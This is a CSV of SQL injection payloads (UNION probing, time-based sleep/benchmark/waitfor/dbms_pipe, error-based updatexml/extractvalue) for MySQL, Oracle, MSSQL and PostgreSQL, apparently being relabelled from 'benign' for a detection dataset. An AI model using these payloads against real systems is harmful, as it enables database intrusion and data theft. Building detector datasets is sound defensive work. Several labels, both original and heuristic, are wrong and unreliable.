"1 union all select null,null,null,null,null,null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1 union all select null,null,null,null,null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) union all select null,null--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1"" ) union all select null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' ) union all select null,null--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1' ) union all select null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
-2733' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'btjx' = 'btjx,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'xmltype' (likely false negative),error_based,oracle,-2733' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'btjx' = 'btjx,False,0,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'dbms_pipe' (likely false negative),time_blind,oracle,"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
1' ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,1' ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1 union all select null,null,null,null,null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1 union all select null,null,null,null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1'+ ( select lang where 4191 = 4191 union all select null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1'+ ( select lang where 4191 = 4191 union all select null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1%' ) ) union all select null--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,1%' ) ) union all select null--,False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' ) ) as nuku where 7009 = 7009 union all select null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1' ) ) as nuku where 7009 = 7009 union all select null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1 ) ) union all select null,null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1 ) ) union all select null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1 ) where 2020 = 2020 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'benchmark' (likely false negative),time_blind,mysql,"1 ) where 2020 = 2020 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'dbms_pipe' (likely false negative),time_blind,oracle,"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
"1 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'benchmark' (likely false negative),time_blind,mysql,"1 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1%' ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),boolean_blind,mysql,"1%' ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"-1015"" ) ) union all select 6624,6624#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-1015"" ) ) union all select 6624,6624#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""iuxs"" like ""iuxs",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'benchmark' (likely false negative),time_blind,mysql,"1"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""iuxs"" like ""iuxs",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'jfwt' like 'jfwt",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'benchmark' (likely false negative),time_blind,mysql,"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'jfwt' like 'jfwt",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"-1487"" ) as crfi where 2407 = 2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-1487"" ) as crfi where 2407 = 2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ""umst"" = ""umst",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'updatexml' (likely false negative),boolean_blind,mysql,"1"" ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ""umst"" = ""umst",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" ) ) union all select null,null,null,null,null,null,null,null--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1"" ) ) union all select null,null,null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-5691' union all select 6610,6610#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-5691' union all select 6610,6610#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1'|| ( select 'ybfo' from dual where 3319 = 3319 union all select null,null,null,null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,oracle,"1'|| ( select 'ybfo' from dual where 3319 = 3319 union all select null,null,null,null,null,null,null,null#",False,0,union_based,oracle,Pattern match: 'union all select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure
"-3442' in boolean mode ) union all select 6255,6255,6255,6255,6255#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-3442' in boolean mode ) union all select 6255,6255,6255,6255,6255#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' where 6721 = 6721 union all select null,null,null,null,null,null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1' where 6721 = 6721 union all select null,null,null,null,null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1 ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),boolean_blind,mysql,"1 ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"-2849' union all select 6491,6491,6491,6491,6491,6491,6491--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-2849' union all select 6491,6491,6491,6491,6491,6491,6491--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1%"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""%"" = """,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,"1%"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""%"" = """,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
1' where 5455 = 5455 and sleep ( 5 ) --,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,1' where 5455 = 5455 and sleep ( 5 ) --,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"-2007%' ) ) union all select 7298,7298,7298#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-2007%' ) ) union all select 7298,7298,7298#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' ) ) as sxpk where 5524 = 5524 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),boolean_blind,mysql,"1' ) ) as sxpk where 5524 = 5524 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"select sleep ( 5 ) and ""jvys"" like ""jvys",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,"select sleep ( 5 ) and ""jvys"" like ""jvys",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"-6086"" union all select 8700,8700,8700,8700--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-6086"" union all select 8700,8700,8700,8700--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1 where 2292 = 2292 union all select null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1 where 2292 = 2292 union all select null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1 ) ) as skex where 7941 = 7941 and sleep ( 5 ) --,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,1 ) ) as skex where 7941 = 7941 and sleep ( 5 ) --,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1"" or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,"1"" or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
1 ) as uhmm where 2304 = 2304 union all select null#,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,1 ) as uhmm where 2304 = 2304 union all select null#,False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-1150' ) as hdby where 4032 = 4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-1150' ) as hdby where 4032 = 4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1 ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( 8024 = 8024",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),boolean_blind,mysql,"1 ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( 8024 = 8024",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"select pg_sleep ( 5 ) and ( ( ( ""wqeb"" = ""wqeb",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,postgresql,"select pg_sleep ( 5 ) and ( ( ( ""wqeb"" = ""wqeb",False,0,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal
"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),boolean_blind,mysql,"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo )",False,0,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
"1"" and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,"1"" and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1 ) as zhvx where 3171 = 3171 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'extractvalue' (likely false negative),error_based,mysql,"1 ) as zhvx where 3171 = 3171 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",False,0,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
1' ) waitfor delay '0:0:5',benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'waitfor' (likely false negative),time_blind,mssql,1' ) waitfor delay '0:0:5',False,0,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected
"1%"" ) ) union all select null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1%"" ) ) union all select null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" where 9632 = 9632 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),boolean_blind,mysql,"1"" where 9632 = 9632 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"-2384%' ) ) union all select 2467,2467,2467,2467#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-2384%' ) ) union all select 2467,2467,2467,2467#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) ) union all select null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1"" ) ) union all select null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1'+ ( select 'gmpn' where 8137 = 8137 or sleep ( 5 ) ) +',benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,1'+ ( select 'gmpn' where 8137 = 8137 or sleep ( 5 ) ) +',False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""qcqx"" like ""qcqx",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,"1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""qcqx"" like ""qcqx",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
"-5657' ) ) ) union all select 8071,8071,8071,8071,8071,8071,8071,8071#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-5657' ) ) ) union all select 8071,8071,8071,8071,8071,8071,8071,8071#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1%"" ) ) and sleep ( 5 ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,"1%"" ) ) and sleep ( 5 ) #",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"1'|| ( select 'ysij' from dual where 6140 = 6140 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) ) ||'",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'benchmark' (likely false negative),error_based,oracle,"1'|| ( select 'ysij' from dual where 6140 = 6140 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) ) ||'",False,0,error_based,oracle,Pattern match: 'extractvalue (' → error_based (P4); DB signature: oracle,heavy_query,oracle,contains 7+ digit number (DoS-style payload)
"1' in boolean mode ) union all select null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1' in boolean mode ) union all select null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-1559 union all select 3985,3985,3985,3985#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-1559 union all select 3985,3985,3985,3985#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-5934' union all select 6096,6096,6096,6096,6096#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-5934' union all select 6096,6096,6096,6096,6096#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1%"" ) ) ) union all select null,null,null,null,null,null,null,null,null--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1%"" ) ) ) union all select null,null,null,null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) ) as jgie where 8017 = 8017 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,"1"" ) ) as jgie where 8017 = 8017 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
1' waitfor delay '0:0:5' and 'dtej' like 'dtej,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'waitfor' (likely false negative),time_blind,mssql,1' waitfor delay '0:0:5' and 'dtej' like 'dtej,False,0,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected
"1' union all select null,null,null,null,null,null,null,null,null--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1' union all select null,null,null,null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"select sleep ( 5 ) and ( ( ""rthl"" like ""rthl",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,"select sleep ( 5 ) and ( ( ""rthl"" like ""rthl",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1' ) ) as owcw where 1107 = 1107 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'dbms_pipe' (likely false negative),time_blind,oracle,"1' ) ) as owcw where 1107 = 1107 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
"1 ) where 1559 = 1559 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'updatexml' (likely false negative),boolean_blind,mysql,"1 ) where 1559 = 1559 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
